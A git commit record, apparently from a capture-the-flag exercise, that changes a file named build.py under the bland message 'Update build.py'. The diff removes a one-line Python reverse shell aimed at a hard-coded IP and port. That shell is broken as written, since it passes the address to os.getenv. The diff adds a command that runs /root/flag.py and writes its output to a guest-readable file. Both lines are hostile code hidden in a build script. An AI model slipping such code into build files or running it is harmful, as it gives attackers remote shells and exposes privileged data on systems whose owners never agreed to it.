34de4a57d2799320e6ed993f0c3a175da3ef93a9
SkyrusRB <82556556+SkyrusRB@users.noreply.github.com>
2022-12-03 21:19:29 +0800

    Update build.py

--- build.py
+++ build.py
@@ -1,1 +1,2 @@
-import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("115.66.253.17"),int(os.getenv("8080"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
+import os
+os.system('python3 /root/flag.py > /home/guest/lol.txt')
